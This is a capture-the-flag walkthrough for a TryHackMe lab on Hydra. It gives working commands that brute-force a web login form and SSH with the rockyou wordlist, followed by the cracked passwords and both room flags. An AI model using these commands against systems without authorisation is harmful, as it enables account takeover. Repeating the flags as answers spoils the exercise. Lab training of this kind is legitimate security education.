# **TryHackMe Hydra Walkthrough: Brute-Forcing Protocols**

---

### **Introduction: Hydra Commands & Syntax**

The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being `user` and a password list being `passlist.txt`, we’d use the following command:

`hydra -l user -P passlist.txt ftp://10.114.163.45`

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

#### **SSH**
`hydra -l <username> -P <full path to pass> 10.114.163.45 -t 4 ssh`

| Option | Description |
| :--- | :--- |
| `-l` | specifies the (SSH) username for login |
| `-P` | indicates a list of passwords |
| `-t` | sets the number of threads to spawn |

For example, `hydra -l root -P passwords.txt 10.114.163.45 -t 4 ssh` will run with the following arguments:
*   Hydra will use `root` as the username for ssh.
*   It will try the passwords in the `passwords.txt` file.
*   There will be four threads running in parallel as indicated by `-t 4`.

#### **Post Web Form**
We can use Hydra to brute force web forms, too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> 10.114.163.45 http-post-form "<path>:<login_credentials>:<invalid_response>"`

| Option | Description |
| :--- | :--- |
| `-l` | the username for (web form) login |
| `-P` | the password list to use |
| `http-post-form` | The type of the form is POST |
| `<path>` | the login page URL, for example, `login.php` |
| `<login_credentials>` | the username and password used to log in, for example, `username=^USER^&password=^PASS^` |
| `<invalid_response>` | part of the response when the login fails |
| `-V` | verbose output for every attempt |

Below is a more concrete example Hydra command to brute force a POST login form:
`hydra -l <username> -P <wordlist> 10.114.163.45 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

*   The login page is only `/`, i.e., the main IP address.
*   The username is the form field where the username is entered.
*   The specified username(s) will replace `^USER^`.
*   The password is the form field where the password is entered.
*   The provided passwords will be replacing `^PASS^`.
*   Finally, `F=incorrect` is a string that appears in the server reply when the login fails.

*Note: If the web server is listening on a non-default port number, you can explicitly specify the port number using `-s <port>`.*

---

### **Task 1: Brute-Forcing the Web Form (Flag 1)**

Now, put this into practice to brute-force the credentials on the deployed machine.

1.  **Execute the Hydra Command:**
    Run the following command to attack the web login form:
    `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.114.163.45 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -s 80 -V`
2.  **Retrieve the Password:**
    *   Hydra will run through the `rockyou.txt` wordlist.
    *   It will successfully find 1 valid password for the user `molly`.
    *   The discovered web password is: `sunshine`.
3.  **Capture Flag 1:**
    *   Log into the web application using the newly found credentials.
    *   The web page will reveal the first flag.
    *   **Flag 1:** `THM{2673a7dd116de68e85c48ec0b1f2612e}`.

---

### **Task 2: Brute-Forcing SSH (Flag 2)**

Next, you will use Hydra to crack the SSH password for the same user.

1.  **Execute the Hydra Command:**
    Run the following command to brute-force the SSH service:
    `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.114.163.45 -t 4 ssh`
2.  **Retrieve the Password:**
    *   Hydra will initiate 4 parallel tasks to attack the SSH service on port 22.
    *   It will successfully identify 1 valid password.
    *   The discovered SSH password for `molly` is: `butterfly`.
3.  **Capture Flag 2:**
    *   Connect to the target machine via SSH by running: `ssh molly@10.114.163.45`.
    *   Accept the host authenticity warning and log in using the password `butterfly`.
    *   Once connected, run `ls` to list the directory contents, which reveals a file named `flag2.txt`.
    *   Output the contents of the file using `cat flag2.txt`.
    *   **Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`.
